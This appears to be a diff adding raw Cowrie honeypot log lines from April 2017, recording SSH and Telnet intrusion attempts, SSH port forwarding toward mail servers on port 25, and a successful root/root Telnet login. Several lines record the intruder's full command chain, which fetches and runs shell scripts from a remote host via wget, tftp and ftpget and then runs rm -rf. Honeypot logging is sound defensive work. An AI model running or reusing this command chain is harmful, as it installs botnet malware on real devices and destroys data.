@@ -93,3 +93,55 @@
 	reason: 
 2017-04-06T05:03:00+0000 [HoneyPotSSHTransport,91920,121.18.238.98] connection lost
 2017-04-06T05:03:00+0000 [HoneyPotSSHTransport,91920,121.18.238.98] Connection lost after 2 seconds
+2017-04-06T05:03:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] got channel 'direct-tcpip' request
+2017-04-06T05:03:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] direct-tcp connection request to 216.32.181.74:25 from localhost:5556
+2017-04-06T05:03:11+0000 [CowrieTelnetTransport,202218,37.202.78.33] Closing TTY Log: log/tty/20170406-050130-None-202218i.log after 101 seconds
+2017-04-06T05:03:11+0000 [CowrieTelnetTransport,202218,37.202.78.33] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-04-06T05:03:11+0000 [CowrieTelnetTransport,202218,37.202.78.33] Connection lost after 105 seconds
+2017-04-06T05:03:12+0000 [CowrieTelnetTransport,202219,213.24.132.230] first time for 213.24.132.230, need: 1
+2017-04-06T05:03:12+0000 [CowrieTelnetTransport,202219,213.24.132.230] login attempt: 1
+2017-04-06T05:03:14+0000 [CowrieTelnetTransport,202219,213.24.132.230] login attempt [root/root] succeeded
+2017-04-06T05:03:15+0000 [CowrieTelnetTransport,202219,213.24.132.230] Opening TTY Log: log/tty/20170406-050315-None-202219i.log
+2017-04-06T05:03:15+0000 [CowrieTelnetTransport,202219,213.24.132.230] Warning: state changed and new state returned
+2017-04-06T05:03:23+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 119.249.54.71:39586 (10.8.41.81:2222) [session: 064fd94b]
+2017-04-06T05:03:24+0000 [HoneyPotSSHTransport,91921,119.249.54.71] Remote SSH version: SSH-2.0-PUTTY
+2017-04-06T05:03:24+0000 [HoneyPotSSHTransport,91921,119.249.54.71] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-04-06T05:03:24+0000 [HoneyPotSSHTransport,91921,119.249.54.71] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-06T05:03:24+0000 [HoneyPotSSHTransport,91921,119.249.54.71] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-06T05:03:25+0000 [HoneyPotSSHTransport,91921,119.249.54.71] NEW KEYS
+2017-04-06T05:03:25+0000 [HoneyPotSSHTransport,91921,119.249.54.71] starting service 'ssh-userauth'
+2017-04-06T05:03:25+0000 [HoneyPotSSHTransport,91921,119.249.54.71] Got remote error, code 11
+	reason: 
+2017-04-06T05:03:25+0000 [HoneyPotSSHTransport,91921,119.249.54.71] connection lost
+2017-04-06T05:03:25+0000 [HoneyPotSSHTransport,91921,119.249.54.71] Connection lost after 1 seconds
+2017-04-06T05:03:33+0000 [CowrieTelnetTransport,202219,213.24.132.230] CMD: sh
+2017-04-06T05:03:33+0000 [CowrieTelnetTransport,202219,213.24.132.230] Command found: sh 
+2017-04-06T05:03:36+0000 [HoneyPotSSHTransport,91919,103.243.107.233] connection lost
+2017-04-06T05:03:36+0000 [HoneyPotSSHTransport,91919,103.243.107.233] Connection lost after 50 seconds
+2017-04-06T05:03:38+0000 [SSHChannel None (593) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] remote eof
+2017-04-06T05:03:38+0000 [SSHChannel None (593) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] remote close
+2017-04-06T05:03:38+0000 [SSHChannel None (593) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] sending close 593
+2017-04-06T05:03:39+0000 [SSHChannel None (594) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] remote eof
+2017-04-06T05:03:39+0000 [SSHChannel None (594) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] remote close
+2017-04-06T05:03:39+0000 [SSHChannel None (594) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] sending close 594
+2017-04-06T05:03:40+0000 [CowrieTelnetTransport,202219,213.24.132.230] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.10/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 107.178.96.10 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.178.96.10; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 107.178.96.10 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-04-06T05:03:40+0000 [CowrieTelnetTransport,202219,213.24.132.230] Command found: cd /tmp
+2017-04-06T05:03:40+0000 [CowrieTelnetTransport,202219,213.24.132.230] Command found: cd /var/run
+2017-04-06T05:03:40+0000 [CowrieTelnetTransport,202219,213.24.132.230] Command found: cd /mnt
+2017-04-06T05:03:40+0000 [CowrieTelnetTransport,202219,213.24.132.230] Command found: cd /root
+2017-04-06T05:03:40+0000 [CowrieTelnetTransport,202219,213.24.132.230] Command found: cd /
+2017-04-06T05:03:40+0000 [CowrieTelnetTransport,202219,213.24.132.230] Command found: wget http://107.178.96.10/bins.sh
+2017-04-06T05:03:40+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.178.96.10/bins.sh>
+2017-04-06T05:03:43+0000 [CowrieTelnetTransport,202219,213.24.132.230] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.10/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 107.178.96.10 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.178.96.10; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 107.178.96.10 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-04-06T05:03:48+0000 [CowrieTelnetTransport,202219,213.24.132.230] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.10/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 107.178.96.10 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.178.96.10; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 107.178.96.10 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-04-06T05:03:49+0000 [SSHChannel None (595) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] direct-tcp forward to 182.22.12.117:25 with data 'QUIT\r\n'
+2017-04-06T05:03:49+0000 [SSHChannel None (595) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] failed to connect: Connection refused
+2017-04-06T05:03:49+0000 [SSHChannel None (595) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] sending close 595
+2017-04-06T05:03:49+0000 [SSHChannel None (595) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] remote eof
+2017-04-06T05:03:49+0000 [SSHChannel None (595) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91222,91.230.47.81] remote close
+2017-04-06T05:03:54+0000 [CowrieTelnetTransport,202219,213.24.132.230] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.10/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 107.178.96.10 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.178.96.10; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 107.178.96.10 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-04-06T05:03:54+0000 [CowrieTelnetTransport,202219,213.24.132.230] Closing TTY Log: log/tty/20170406-050315-None-202219i.log after 38 seconds
+2017-04-06T05:03:54+0000 [CowrieTelnetTransport,202219,213.24.132.230] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-04-06T05:03:54+0000 [CowrieTelnetTransport,202219,213.24.132.230] Connection lost after 74 seconds
